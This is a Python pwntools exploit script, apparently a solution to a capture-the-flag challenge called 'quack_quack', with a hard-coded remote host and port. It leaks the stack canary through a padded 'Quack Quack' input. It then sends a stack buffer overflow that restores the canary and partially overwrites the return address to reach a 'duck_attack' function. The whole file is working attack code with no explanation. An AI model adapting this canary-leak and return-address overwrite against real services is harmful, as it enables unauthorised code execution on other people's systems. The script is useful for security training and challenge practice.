#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './quack_quack'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.54.190',44748

endloop = True
pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    b *duckling+334
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io, endloop
    io = initialize()

    io.sendafter("> ", b"Quack Quack \x00".rjust(0x66, b" "))
    io.recvuntil("Quack Quack ")
    canary = u64(io.recv(7).ljust(8, b"\x00")) << 8
    log.info("Canary: %#x", canary)
    io.sendafter("> ", b"B"*0x58 + p64(canary) + p64(0) + p64(elf.sym['duck_attack'])[:3])
    io.interactive()


if __name__ == '__main__':
    exploit()
